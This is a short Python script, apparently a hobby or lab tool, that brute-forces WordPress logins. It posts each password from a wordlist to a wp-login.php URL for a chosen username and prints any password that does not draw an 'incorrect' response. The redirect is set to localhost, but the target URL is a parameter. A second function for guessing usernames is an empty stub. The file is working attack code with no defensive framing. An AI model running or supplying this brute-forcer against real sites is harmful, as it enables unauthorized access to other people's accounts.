import requests
import re
import sys
from termcolor import cprint 

def brute_force_passwords(user, wordlist, url, verbose):
    cprint('Go, GOPIENKO SHADOW!\n', 'magenta', attrs=['bold'])
    s = requests.Session()
    r = s.get(url)
    cookies = dict(r.cookies) 
    with open(wordlist) as f:
        match_count = 0
        for passwd in f:
            passwd = passwd.strip()
            payload = {'log': user,
                       'pwd': passwd,
                       'wp-submit': 'Log+In', 
                       'redirect_to' : 'http://localhost/wordpress/wp-login.php',
                       'testcookie': '1'}
            r = s.post(url, data=payload, cookies=cookies)
            check_regex = re.compile('incorrect')
            fail = check_regex.search(r.text)
            if fail:
                cprint(passwd, 'red')
            else:
                cprint(f'Access Granted for password for {user}', 'green', end='')
                cprint(passwd, 'green', attrs=['reverse'])
                match_count += 1
                if verbose is not True:
                    sys.exit()
                else:
                    continue
        if match_count == 0:
            cprint(f'No valid login found for {user} in {wordlist}', 'yellow')
        else:
            cprint(f'{str(match_count)} match(es) found. Refer to the above', 'green')    

def brute_force_users():
    pass
